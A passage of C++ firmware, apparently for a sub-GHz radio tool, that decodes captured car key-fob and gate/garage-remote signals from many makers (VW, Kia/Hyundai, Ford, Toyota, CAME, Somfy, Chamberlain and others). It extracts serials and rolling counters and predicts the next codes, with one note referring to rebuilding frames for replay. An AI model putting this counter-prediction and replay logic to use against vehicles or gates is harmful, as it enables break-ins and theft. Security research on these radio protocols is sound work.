  if(!decoded&&te_vag){uint32_t vtid=0;uint16_t vctr=0;uint8_t vbtn=0;bool vv=false;if(ks_decodeVAG(buf,cnt,vtid,vctr,vbtn,vv)){decoded=true;doc["proto"]="VAG-pre2004";char fh[12];snprintf(fh,12,"0x%08lX",(unsigned long)vtid);doc["sn"]=fh;doc["ctr"]=vctr;doc["btn"]=vbtn;doc["ck_ok"]=vv;doc["mfr"]="VW/Audi/Seat/Skoda";HistEntry he={vtid,0,(uint32_t)vctr,24,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(vtid,24,(uint32_t)vctr);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_ctr"]=(uint32_t)((vctr+d)&0xFFFF);p["window"]=1024;p["note"]="VW/Audi/Seat/Skoda pre-2004 (ID48 era) 16-bit rolling";}}
  // 1g. Hyundai / Kia RIO early (~2001-2008) — 64-bit fixed-code, ~c checksum
  if(!decoded&&te_hkr){uint32_t hs=0;uint16_t hbm=0;bool hv=false;if(ks_decodeHKR(buf,cnt,hs,hbm,hv)){decoded=true;doc["proto"]="Hyundai-KiaRIO";char fh[12];snprintf(fh,12,"0x%08lX",(unsigned long)hs);doc["sn"]=fh;doc["btn_mask"]=hbm;doc["ck_ok"]=hv;doc["mfr"]="Hyundai/Kia (early)";HistEntry he={hs,0,(uint32_t)hbm,25,mhz,nowMs};ks_hPush(he);JsonObject p=doc["predict"].to<JsonObject>();p["window"]=0;p["note"]="Hyundai/Kia Accent/Rio/Elantra 2001-2008 fixed code";}}
  // 1h. Hyundai Santa Fe / Solaris 2013-2016 (TRW) — 80-bit MSB-first, Hitag2 rolling, CRC8-0x31
  if(!decoded&&te_sfe){uint32_t sfr=0,sfs=0;uint8_t sfc=0,sfb=0;bool sfv=false;if(ks_decodeSantaFe(buf,cnt,sfr,sfs,sfc,sfb,sfv)){decoded=true;doc["proto"]="Hyundai-SantaFe";char fh[10];snprintf(fh,10,"0x%06lX",(unsigned long)sfs);doc["sn"]=fh;char rh[12];snprintf(rh,12,"0x%08lX",(unsigned long)sfr);doc["rolling"]=rh;doc["ctr"]=sfc;doc["btn"]=sfb;doc["ck_ok"]=sfv;doc["mfr"]="Hyundai (TRW)";HistEntry he={sfs,sfr,(uint32_t)sfc,26,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(sfs,26,(uint32_t)sfc);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_ctr"]=(uint32_t)((sfc+d)&0xFF);p["window"]=256;p["note"]="Hyundai Santa Fe/Solaris 2013-2016 Hitag2-derived rolling";}}
  // 1i. BMW CAS4 / VW Touareg — 64-bit Manchester, strict markers (byte[0]==0x30, byte[6]==0xC5).
  // Vehicle protocol, so checked here (ahead of gate decoders) rather than in the Manchester fallback.
  if(!decoded){static char mbA[CAP_SZ/2+1];uint16_t mlA=ks_manchester(bits,bLen,mbA);if(mlA>=64){uint64_t cas4f=0;if(ks_decodeBMWCAS4(mbA,mlA,cas4f)){decoded=true;char fh[20];snprintf(fh,20,"%08lX%08lX",(unsigned long)(cas4f>>32),(unsigned long)(cas4f&0xFFFFFFFFUL));doc["proto"]="BMW-CAS4";doc["frame"]=fh;uint32_t cas4sn=(uint32_t)(cas4f>>32);doc["sn"]=cas4sn;doc["mfr"]="BMW/VW-Touareg (CAS4)";HistEntry he={cas4sn,0,0,27,mhz,nowMs};ks_hPush(he);JsonObject p=doc["predict"].to<JsonObject>();p["window"]=0;p["note"]="BMW CAS4 64-bit Manchester — crypto not public";}}}
  // 1j. KIA/HYU V0 — 61-bit OOK PWM, CRC8 poly=0x7F, 433 MHz rolling code
  if(!decoded&&te_kv0){uint32_t kvsn=0;uint16_t kvctr=0;uint8_t kvbtn=0;bool kvv=false;if(ks_decodeKiaV0(buf,cnt,kvsn,kvctr,kvbtn,kvv)){decoded=true;doc["proto"]="KIA-V0";char fh[12];snprintf(fh,12,"0x%08lX",(unsigned long)kvsn);doc["sn"]=fh;doc["ctr"]=kvctr;doc["btn"]=kvbtn;doc["ck_ok"]=kvv;doc["mfr"]="Kia/Hyundai";HistEntry he={kvsn,0,(uint32_t)kvctr,29,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(kvsn,29,(uint32_t)kvctr);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_ctr"]=(uint32_t)((kvctr+(uint16_t)d)&0xFFFF);p["window"]=4096;p["note"]="KIA/HYU V0 61-bit OOK PWM (CRC8 poly=0x7F)";}}
  // 1k. KIA/HYU V1 — 57-bit OOK Manchester, CRC4, 315 MHz rolling code
  if(!decoded&&te_kv1){static char mbV1[CAP_SZ/2+1];uint16_t mlV1=ks_manchester(bits,bLen,mbV1);if(mlV1>=57){uint32_t kvsn=0;uint16_t kvctr=0;uint8_t kvbtn=0;bool kvv=false;if(ks_decodeKiaV1(mbV1,mlV1,kvsn,kvctr,kvbtn,kvv)){decoded=true;doc["proto"]="KIA-V1";char fh[12];snprintf(fh,12,"0x%08lX",(unsigned long)kvsn);doc["sn"]=fh;doc["ctr"]=kvctr;doc["btn"]=kvbtn;doc["ck_ok"]=kvv;doc["mfr"]="Kia/Hyundai";HistEntry he={kvsn,0,(uint32_t)kvctr,30,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(kvsn,30,(uint32_t)kvctr);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_ctr"]=(uint32_t)((kvctr+(uint16_t)d)&0xFFF);p["window"]=4096;p["note"]="KIA/HYU V1 57-bit Manchester (CRC4)";}}}
  // 1l. Ford V0 — 80-bit OOK Manchester, GF(2) CRC, 315/433 MHz
  if(!decoded&&te_frdv0){static char mbFV[CAP_SZ/2+1];uint16_t mlFV=ks_manchester(bits,bLen,mbFV);if(mlFV>=80){uint32_t fvsn=0;uint8_t fvb=0;uint32_t fvc=0;if(ks_decodeFordV0(mbFV,mlFV,fvsn,fvb,fvc)){decoded=true;doc["proto"]="Ford-V0";char fh[12];snprintf(fh,12,"0x%08lX",(unsigned long)fvsn);doc["sn"]=fh;doc["btn"]=fvb;doc["ctr"]=fvc;doc["mfr"]="Ford/Lincoln";HistEntry he={fvsn,0,fvc,31,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(fvsn,31,fvc);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_ctr"]=(fvc+(uint32_t)d)&0xFFFFFF;p["window"]=1048576;p["note"]="Ford V0 80-bit Manchester GF(2) CRC";}}}
  // 1m. KIA/HYU V7 — 64-bit Manchester FM, CRC8 poly=0x7F init=0x4C, 433 MHz
  if(!decoded&&te_kv7){static char mbV7[CAP_SZ/2+1];uint16_t mlV7=ks_manchester(bits,bLen,mbV7);if(mlV7>=64){uint32_t kv7sn=0;uint16_t kv7ct=0;uint8_t kv7b=0;bool kv7v=false;if(ks_decodeKiaV7(mbV7,mlV7,kv7sn,kv7ct,kv7b,kv7v)){decoded=true;doc["proto"]="KIA-V7";char fh[12];snprintf(fh,12,"0x%08lX",(unsigned long)kv7sn);doc["sn"]=fh;doc["ctr"]=kv7ct;doc["btn"]=kv7b;doc["ck_ok"]=kv7v;doc["mfr"]="Kia/Hyundai";HistEntry he={kv7sn,0,(uint32_t)kv7ct,33,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(kv7sn,33,(uint32_t)kv7ct);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_ctr"]=(uint32_t)((kv7ct+(uint16_t)d)&0xFFFF);p["window"]=4096;p["note"]="KIA/HYU V7 64-bit Manchester FM (CRC8 poly=0x7F init=0x4C)";}}}
  // 1n. KIA/HYU V2 — 53-bit Manchester, CRC4, 433 MHz EU
  if(!decoded&&te_kv2){static char mbKV2[CAP_SZ/2+1];uint16_t mlKV2=ks_manchester(bits,bLen,mbKV2);if(mlKV2>=53){uint32_t kv2sn=0;uint16_t kv2ct=0;uint8_t kv2b=0;bool kv2v=false;if(ks_decodeKiaV2(mbKV2,mlKV2,kv2sn,kv2ct,kv2b,kv2v)){decoded=true;doc["proto"]="KIA-V2";char fh[12];snprintf(fh,12,"0x%08lX",(unsigned long)kv2sn);doc["sn"]=fh;doc["ctr"]=kv2ct;doc["btn"]=kv2b;doc["ck_ok"]=kv2v;doc["mfr"]="Kia/Hyundai (EU)";HistEntry he={kv2sn,0,(uint32_t)kv2ct,32,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(kv2sn,32,(uint32_t)kv2ct);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_ctr"]=(uint32_t)((kv2ct+(uint16_t)d)&0xFFF);p["window"]=4096;p["note"]="KIA/HYU V2 53-bit Manchester (CRC4)";}}}
  // 1o. Subaru V2 — 80-bit Manchester OOK, TE_H≈1013µs, 433 MHz NA
  if(!decoded&&te_sub2){uint32_t sv2sn=0;uint8_t sv2b=0;uint16_t sv2ct=0;bool sv2v=false;if(ks_decodeSubaruV2(buf,cnt,sv2sn,sv2b,sv2ct,sv2v)){decoded=true;char fh[10];snprintf(fh,10,"0x%06lX",(unsigned long)sv2sn);doc["proto"]="Subaru-V2";doc["sn"]=fh;doc["ctr"]=sv2ct;doc["btn"]=sv2b;doc["ck_ok"]=sv2v;doc["mfr"]="Subaru";HistEntry he={sv2sn,0,(uint32_t)sv2ct,34,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(sv2sn,34,(uint32_t)sv2ct);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_ctr"]=(uint32_t)((sv2ct+(uint16_t)d)&0xFFFF);p["window"]=4096;p["note"]="Subaru V2 Manchester OOK (TE_H≈1013µs, 987 baud, 20-bit sequential counter, delta=1)";}}

  // ─── GATE / GARAGE-DOOR OPENERS (checked only after all vehicle protocols) ────
  // 2. CAME-12
  if(!decoded&&te_came&&bLen>=24){uint16_t code=0;if(ks_decodeCame12(bits,bLen,code)){decoded=true;doc["proto"]="CAME-12";doc["code"]=code;char ch[6];snprintf(ch,6,"0x%03X",code);doc["code_hex"]=ch;doc["mfr"]="CAME";doc["ctr"]=code;HistEntry he={code,0,(uint32_t)code,1,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(code,1,(uint32_t)code);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_1"]=(code+d)&0xFFF;p["next_2"]=(code+2*d)&0xFFF;p["next_3"]=(code+3*d)&0xFFF;p["window"]=256;p["note"]="CAME counter wraps at 4096";}}
  // 3. FAAC-64
  if(!decoded&&te_faac&&bLen>=64){uint64_t fr=0;if(ks_decodeFAAC64(bits,bLen,fr)){decoded=true;doc["proto"]="FAAC-64";char fh[20];snprintf(fh,20,"%08lX%08lX",(unsigned long)(fr>>32),(unsigned long)(fr&0xFFFFFFFF));doc["frame"]=fh;uint32_t fsn=(uint32_t)(fr>>32);uint16_t ctr=(uint16_t)(fr&0xFFFF);doc["sn"]=fsn;doc["ctr"]=ctr;doc["mfr"]="FAAC";HistEntry he={fsn,(uint32_t)(fr&0xFFFFFFFF),(uint32_t)ctr,2,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(fsn,2,(uint32_t)ctr);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_ctr"]=(uint32_t)((ctr+d)&0xFFFF);p["window"]=1024;p["note"]="FAAC cipher key required for hop prediction";}}
  // 4. Somfy RTS
  if(!decoded&&te_somf&&bLen>=56){uint64_t raw=0;uint8_t ctrl=0;uint16_t roll=0;uint32_t addr=0;if(ks_decodeSomfy(bits,bLen,raw,ctrl,roll,addr)){decoded=true;doc["proto"]="Somfy-RTS";char rh[18];snprintf(rh,18,"%014llX",(unsigned long long)raw);doc["raw"]=rh;doc["ctrl"]=ctrl;doc["roll"]=roll;doc["addr"]=addr;doc["mfr"]="Somfy";HistEntry he={addr,0,(uint32_t)roll,3,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(addr,3,(uint32_t)roll);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_roll"]=(uint32_t)((roll+d)&0xFFFF);p["window"]=16;p["note"]="Somfy RTS: replay_predicted rebuilds full frame with checksum";}}
  // 5. Nice FLOR
  if(!decoded&&te_nice&&bLen>=52){uint32_t nsn=0,nroll=0;if(ks_decodeNice(bits,bLen,nsn,nroll)){decoded=true;doc["proto"]="Nice-FLOR";doc["sn"]=nsn;doc["roll"]=nroll;doc["mfr"]="Nice";HistEntry he={nsn,0,nroll,4,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(nsn,4,nroll);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_roll"]=(nroll+d)&0xFFFFFF;p["window"]=1024;p["note"]="Nice cipher not public — structural only";}}
  // 6. Marantec
  if(!decoded&&te_mar&&bLen>=32){uint16_t ma=0;uint8_t mc=0;if(ks_decodeMarantec(bits,bLen,ma,mc)){decoded=true;doc["proto"]="Marantec-D";doc["addr"]=ma;doc["cmd"]=mc;doc["mfr"]="Marantec";HistEntry he={ma,0,(uint32_t)ma,5,mhz,nowMs};ks_hPush(he);JsonObject p=doc["predict"].to<JsonObject>();p["window"]=256;p["note"]="Marantec rolling cipher not public";}}
  // 7. PT2262
  if(!decoded&&te_pt&&bLen>=24){uint32_t code=0;if(ks_decodePT2262(bits,bLen,code)){decoded=true;doc["proto"]="PT2262-fixed";char ch[10];snprintf(ch,10,"0x%06lX",(unsigned long)code);doc["code"]=ch;doc["mfr"]="Princeton";HistEntry he={code,0,code,6,mhz,nowMs};ks_hPush(he);JsonObject p=doc["predict"].to<JsonObject>();p["window"]=0;p["note"]="fixed code — no rolling";}}
  // 8. Linear-10
  if(!decoded&&te_lin&&bLen>=10){uint16_t lc=0;if(ks_decodeLinear10(bits,bLen,lc)){decoded=true;doc["proto"]="Linear-10";char ch[8];snprintf(ch,8,"0x%03X",lc);doc["code"]=ch;doc["mfr"]="Linear/Nortek";HistEntry he={lc,0,(uint32_t)lc,7,mhz,nowMs};ks_hPush(he);JsonObject p=doc["predict"].to<JsonObject>();p["window"]=0;p["note"]="fixed DIP code";}}
  // 9. EV1527
  if(!decoded&&te_ev&&bLen>=24){uint32_t ea=0;uint8_t ed=0;if(ks_decodeEV1527(bits,bLen,ea,ed)){decoded=true;doc["proto"]="EV1527";char ch[8];snprintf(ch,8,"0x%05lX",(unsigned long)ea);doc["addr"]=ch;doc["data"]=ed;doc["mfr"]="EV1527/OEM";HistEntry he={ea,0,ea,8,mhz,nowMs};ks_hPush(he);JsonObject p=doc["predict"].to<JsonObject>();p["window"]=0;p["note"]="EV1527 fixed learning code";}}
  // 10. PT2240
  if(!decoded&&te_pt24&&bLen>=20){uint16_t pa=0;uint8_t pd=0;if(ks_decodePT2240(bits,bLen,pa,pd)){decoded=true;doc["proto"]="PT2240";char ch[7];snprintf(ch,7,"0x%04X",pa);doc["addr"]=ch;doc["data"]=pd;doc["mfr"]="Princeton";HistEntry he={pa,0,pa,9,mhz,nowMs};ks_hPush(he);JsonObject p=doc["predict"].to<JsonObject>();p["window"]=0;p["note"]="PT2240 fixed 20-bit code";}}
  // 11. HT12E
  if(!decoded&&te_ht&&bLen>=10){uint8_t ha=0,hd=0;if(ks_decodeHT12E(bits,bLen,ha,hd)){decoded=true;doc["proto"]="HT12E";char ch[5];snprintf(ch,5,"0x%02X",ha);doc["addr"]=ch;doc["data"]=hd;doc["mfr"]="Holtek";HistEntry he={ha,0,ha,10,mhz,nowMs};ks_hPush(he);JsonObject p=doc["predict"].to<JsonObject>();p["window"]=0;p["note"]="Holtek fixed code";}}
  // 12. CAME-TWN30
  if(!decoded&&te_ctwn&&bLen>=30){uint32_t cc=0;if(ks_decodeCameTwn30(bits,bLen,cc)){decoded=true;doc["proto"]="CAME-TWN30";char ch[12];snprintf(ch,12,"0x%08lX",(unsigned long)cc);doc["code"]=ch;uint32_t csn=cc>>12;uint16_t cctr=(uint16_t)(cc&0xFFFU);doc["sn"]=csn;doc["ctr"]=cctr;doc["mfr"]="CAME";HistEntry he={csn,0,cctr,11,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(csn,11,cctr);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_1"]=(cctr+d)&0xFFFU;p["next_2"]=(cctr+2*d)&0xFFFU;p["window"]=256;p["note"]="CAME TWN/TOP rolling — structural only";}}
  // 13. LinearDelta3
  if(!decoded&&te_ld3&&bLen>=38){uint16_t la=0;uint32_t lr=0;if(ks_decodeLD3(bits,bLen,la,lr)){decoded=true;doc["proto"]="LinearDelta3";char ch[8];snprintf(ch,8,"0x%03X",la);doc["addr"]=ch;doc["roll"]=lr;doc["mfr"]="ATA/ELSEMA";HistEntry he={la,0,lr,12,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(la,12,lr);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_roll"]=(lr+(uint32_t)d)&0x0FFFFFFFUL;p["window"]=256;p["note"]="Delta-3 40-bit rolling";}}
  // 14. Hörmann HSM4/HSM8
  if(!decoded&&te_horn&&bLen>=32){uint8_t hbtn=0;uint32_t hsn=0;if(ks_decodeHormann(bits,bLen,hbtn,hsn)){decoded=true;doc["proto"]="Hormann-HSM";char ch[10];snprintf(ch,10,"0x%07lX",(unsigned long)hsn);doc["sn"]=ch;doc["btn"]=hbtn;doc["mfr"]="Hörmann";HistEntry he={hsn,0,(uint32_t)hbtn,13,mhz,nowMs};ks_hPush(he);JsonObject p=doc["predict"].to<JsonObject>();p["window"]=1024;p["note"]="Hörmann HSM — proprietary rolling cipher";}}
  // 15. Sommer Twist/Base
  if(!decoded&&te_somm&&bLen>=40){uint32_t ssn=0;uint16_t sroll=0;if(ks_decodeSommer(bits,bLen,ssn,sroll)){decoded=true;doc["proto"]="Sommer";char ch[10];snprintf(ch,10,"0x%07lX",(unsigned long)ssn);doc["sn"]=ch;doc["roll"]=sroll;doc["mfr"]="Sommer";HistEntry he={ssn,0,(uint32_t)sroll,14,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(ssn,14,(uint32_t)sroll);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_roll"]=(sroll+(uint16_t)d)&0xFFFU;p["window"]=256;p["note"]="Sommer 40-bit rolling";}}
  // 16. Beninca TO.GO
  if(!decoded&&te_beni&&bLen>=26){uint16_t baddr=0;uint8_t bbtn=0;uint16_t bcnt=0;if(ks_decodeBeninca(bits,bLen,baddr,bbtn,bcnt)){decoded=true;doc["proto"]="Beninca-TOGO";char ch[6];snprintf(ch,6,"0x%03X",baddr);doc["addr"]=ch;doc["btn"]=bbtn;doc["ctr"]=bcnt;doc["mfr"]="Beninca";HistEntry he={baddr,0,(uint32_t)bcnt,15,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(baddr,15,(uint32_t)bcnt);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_1"]=(bcnt+(uint16_t)d)&0xFFFU;p["next_2"]=(bcnt+(uint16_t)(2*d))&0xFFFU;p["window"]=256;p["note"]="Beninca 26-bit rolling";}}
  // 17. Cardin S449/S466
  if(!decoded&&te_card&&bLen>=24){uint16_t caddr=0,croll=0;if(ks_decodeCardin(bits,bLen,caddr,croll)){decoded=true;doc["proto"]="Cardin-S449";char ch[6];snprintf(ch,6,"0x%03X",caddr);doc["addr"]=ch;doc["roll"]=croll;doc["mfr"]="Cardin";HistEntry he={caddr,0,(uint32_t)croll,16,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(caddr,16,(uint32_t)croll);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_roll"]=(croll+(uint16_t)d)&0xFFFU;p["window"]=256;p["note"]="Cardin S449/S466 rolling";}}
  // 18. v2 Phox
  if(!decoded&&te_v2ph&&bLen>=64){uint32_t vsn=0,vroll=0;if(ks_decodeV2Phox(bits,bLen,vsn,vroll)){decoded=true;doc["proto"]="V2-Phox";doc["sn"]=vsn;doc["roll"]=vroll;doc["mfr"]="V2";HistEntry he={vsn,0,vroll,17,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(vsn,17,vroll);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_roll"]=(vroll+(uint32_t)d);p["window"]=1024;p["note"]="V2 Phox 64-bit rolling";}}
  // 19. Chamberlain Security+ 1.0 / LiftMaster
  if(!decoded&&te_secp&&bLen>=40){uint16_t sfixed=0;uint32_t sroll=0;if(ks_decodeSecPlus(bits,bLen,sfixed,sroll)){decoded=true;doc["proto"]="Security+";char ch[6];snprintf(ch,6,"0x%03X",sfixed);doc["fixed"]=ch;doc["roll"]=sroll;doc["mfr"]="Chamberlain/LiftMaster";HistEntry he={sfixed,0,sroll,18,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(sfixed,18,sroll);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_roll"]=(sroll+(uint32_t)d)&0x3FFFFFFFUL;p["window"]=4096;p["note"]="Security+ 1.0 rolling code";}}
  // 20. DEA Italian gates
  if(!decoded&&te_dea&&bLen>=40){uint16_t dsn=0;uint32_t droll=0;if(ks_decodeDEA(bits,bLen,dsn,droll)){decoded=true;doc["proto"]="DEA";char ch[8];snprintf(ch,8,"0x%04X",dsn);doc["sn"]=ch;doc["roll"]=droll;doc["mfr"]="DEA";HistEntry he={dsn,0,droll,19,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(dsn,19,droll);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_roll"]=(droll+(uint32_t)d)&0xFFFFFFUL;p["window"]=256;p["note"]="DEA 40-bit rolling";}}
  // 21. AN-Motors AT4 / Doorhan
  if(!decoded&&te_anm&&bLen>=24){uint16_t aaddr=0;uint8_t abtn=0,aroll=0;if(ks_decodeAnMotors(bits,bLen,aaddr,abtn,aroll)){decoded=true;doc["proto"]="AN-Motors";char ch[7];snprintf(ch,7,"0x%04X",aaddr);doc["addr"]=ch;doc["btn"]=abtn;doc["roll"]=aroll;doc["mfr"]="AN-Motors/Doorhan";HistEntry he={aaddr,0,(uint32_t)aroll,20,mhz,nowMs};ks_hPush(he);JsonObject p=doc["predict"].to<JsonObject>();p["window"]=256;p["note"]="AN-Motors/Doorhan 24-bit rolling";}}
  // ─── Gate and garage protocols (v3.13) ─────────────────────────────
  // 22. CAME-24 — same TE as CAME-12; only fires for bLen>=47 (24-bit×2 repeats)
  if(!decoded&&te_came&&bLen>=47){uint32_t c24=0;if(ks_decodeCame24(bits,bLen,c24)){decoded=true;char ch[10];snprintf(ch,10,"0x%06lX",(unsigned long)c24);doc["proto"]="CAME-24";doc["code"]=ch;doc["mfr"]="CAME";HistEntry he={c24,0,c24,21,mhz,nowMs};ks_hPush(he);JsonObject p=doc["predict"].to<JsonObject>();p["window"]=0;p["note"]="CAME 24-bit fixed code";}}
  // 23. Nice FLO — fixed 12-bit or 24-bit, TE=700/1400µs (NOT rolling Nice FloR-S)
  if(!decoded&&te_niceflo){uint32_t nfc=0;uint8_t nfb=0;if(ks_decodeNiceFlo(bits,bLen,nfc,nfb)){decoded=true;char pb[16];snprintf(pb,16,"Nice-FLO-%d",nfb);doc["proto"]=pb;char ch[10];snprintf(ch,10,"0x%06lX",(unsigned long)nfc);doc["code"]=ch;doc["bits"]=nfb;doc["mfr"]="Nice";HistEntry he={nfc,0,nfc,22,mhz,nowMs};ks_hPush(he);JsonObject p=doc["predict"].to<JsonObject>();p["window"]=0;p["note"]="Nice FLO fixed code";}}
  // 24. FAAC SLH — 64-bit structural, TE=255/595µs, fix=(sn<<4)|btn
  if(!decoded&&te_faacslh&&bLen>=64){uint32_t fslhsn=0,fslhhop=0;uint8_t fslhb=0;if(ks_decodeFAACSlh(bits,bLen,fslhsn,fslhb,fslhhop)){decoded=true;doc["proto"]="FAAC-SLH";doc["sn"]=fslhsn;char hh[12];snprintf(hh,12,"0x%08lX",(unsigned long)fslhhop);doc["hop"]=hh;doc["btn"]=fslhb;doc["mfr"]="FAAC";HistEntry he={fslhsn,fslhhop,0,23,mhz,nowMs};ks_hPush(he);JsonObject p=doc["predict"].to<JsonObject>();p["window"]=0;p["note"]="FAAC SLH 64-bit — OEM key required for hop decrypt";}}
  // 25. V2 Phoenix — 52-bit rolling, TE=427/853µs, bit-reversed serial+btn+enc_ctr
  if(!decoded&&te_phxv2&&bLen>=50){uint32_t phxsn=0;uint8_t phxb=0;uint16_t phxec=0;if(ks_decodePhoenixV2(bits,bLen,phxsn,phxb,phxec)){decoded=true;doc["proto"]="Phoenix-V2";doc["sn"]=phxsn;doc["btn"]=phxb;doc["enc_ctr"]=phxec;doc["mfr"]="CAME/Phoenix";HistEntry he={phxsn,0,(uint32_t)phxec,24,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(phxsn,24,(uint32_t)phxec);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_ctr"]=(phxec+(uint16_t)d)&0xFFFF;p["window"]=65536;p["note"]="V2 Phoenix rolling — counter LFSR-encrypted, structural only";}}
  // 1j. Toyota-Denso Channel-A soft-ID — fires AFTER all automotive AND gate decoders have run.
  // Restricted to Channel A (~312 MHz) only. Channel B (~315 MHz) overlaps Security+
  // (te_secp: cA 380-560, ratio 1.6-2.4 at <320 MHz), making a safe soft-ID impossible there.
  // At 312 MHz no deployed garage protocol operates, so the false-positive risk is negligible.
  // Ratio guard REMOVED (was 1.6-2.4): when CC1101 RSSI lag inflates 2T LO pulses >120%,
  // cB/cA exceeds 2.4 — te_kl and te_pt (now !toyotaDual-gated) both fail, leaving the signal
  // with no decoder match and falling to the OOK fallback. The only km=true signals at 312 MHz
  // with te_toy (cA 150-700 µs) are Toyota/Denso, regardless of ratio.
  // Confidence levels: "too_short" (cnt<80, loop never ran) vs "heuristic" (loop ran, no serial).
  if(!decoded&&toyotaA&&te_toy){
    decoded=true;
    doc["proto"]="Toyota-Denso";
    doc["mfr"]="Toyota/Lexus (Denso)";
    doc["sn"]="0x000000";doc["btn"]=0;doc["ctr"]=0;doc["ck_ok"]=false;
    doc["channel"]="A";
    doc["confirmed"]=false;
    if(cnt < 60){
      doc["confidence"]="too_short";
      JsonObject p=doc["predict"].to<JsonObject>();
      p["window"]=0;
      p["note"]="Toyota/Denso Ch-A — only "+String(cnt)+" edges (need 60+); press fob closer or hold longer";
    } else {
      doc["confidence"]="heuristic";
      JsonObject p=doc["predict"].to<JsonObject>();
      p["window"]=0;
      p["note"]="Toyota/Denso Ch-A — "+String(cnt)+" edges, TE distortion likely (RSSI mode); proprietary rolling code";
    }
  }
  // 1k-B. Toyota-Denso Channel-B soft-ID — fires only when Channel A soft-ID does not apply.
  // Channel B (~314-315 MHz) overlaps Security+ 1.0 and Ford/GM 315 MHz frequency range,
  // so this is marked with a lower confidence label "possible" to flag the ambiguity.
  // km=true path only: a clean Toyota preamble (km=false) would have been caught by the
  // km-bypass block above and returned early.
  //
  // Ratio guard (≤3.0, tightened from ≤5.0 in v3.51):
  // Toyota Ch-B fobs in the catch-all path (serial=0) produce k-means ratio 1.0–2.8.
  // The old ≤5.0 guard was set conservatively for RSSI-lag inflation of 2T LO pulses,
  // but empirical evidence shows that ratio stays well below 3.0 for real Toyota signals:
  // a preamble-only capture has ratio≈1.0 (equal-width alternating pulses); a mixed
  // preamble+data capture lands at ratio≈1.5–2.5; RSSI lag can inflate this to ≈2.8.
  //
  // Non-Toyota 315 MHz devices (Ford, GM, other OEM) alias into the Toyota Ch-B band
  // when the sweep hits 314.65 MHz: the CC1101 filter is ~350 kHz off-center from the
  // 315 MHz carrier, which collapses the long LO pulses and drops the ratio from the
  // true value (~10 for an asymmetric Ford OOK fob) down to 3.3–4.9.  Every non-Toyota
  // false positive in the catch-all has ratio > 3.0; every real preamble-only Toyota
  // capture has ratio < 3.0.  The ≤3.0 gate cleanly separates the two populations.
  // (v3.53)
  // NOTE: this soft-ID deliberately keeps its ratio<=3.0 ceiling. Its job is to label an
  // AMBIGUOUS Ch-B signal as "possible Toyota" when the real decoder cannot confirm a
  // frame, and the low-ratio population is exactly that ambiguous case. The real decoder's
  // guard is a floor (see the primary dispatch); leaving this one alone avoids relabelling
  // high-ratio signals that are not being decoded as frames.
  if(!decoded&&toyotaB&&te_toy&&ratio<=3.0f){
    decoded=true;
    doc["proto"]="Toyota-Denso";
    doc["mfr"]="Toyota/Lexus (Denso)";
    doc["sn"]="0x000000";doc["btn"]=0;doc["ctr"]=0;doc["ck_ok"]=false;
    doc["channel"]="B";
    doc["confirmed"]=false;
    if(cnt < 60){
      doc["confidence"]="too_short";
      JsonObject p=doc["predict"].to<JsonObject>();
      p["window"]=0;
      p["note"]="Toyota/Denso Ch-B — only "+String(cnt)+" edges (need 60+); press fob closer (Security+ overlap: verify with Ch-A capture)";
    } else {
      doc["confidence"]="possible";
      JsonObject p=doc["predict"].to<JsonObject>();
      p["window"]=0;
      p["note"]="Toyota/Denso Ch-B possible — "+String(cnt)+" edges, Security+ shares this band; confirm with a matching Ch-A capture at 312.2 MHz";
    }
  }
  // (Vehicle RKE decoders #1c–1i now run earlier, ahead of the gate/garage openers.)
  // 28. Manchester fallback
  if(!decoded){
    static char mb[CAP_SZ/2+1]; uint16_t ml=ks_manchester(bits,bLen,mb);
    if(ml>=12){
      // (BMW-CAS4 now runs early as #1i, ahead of the gate/garage decoders.)
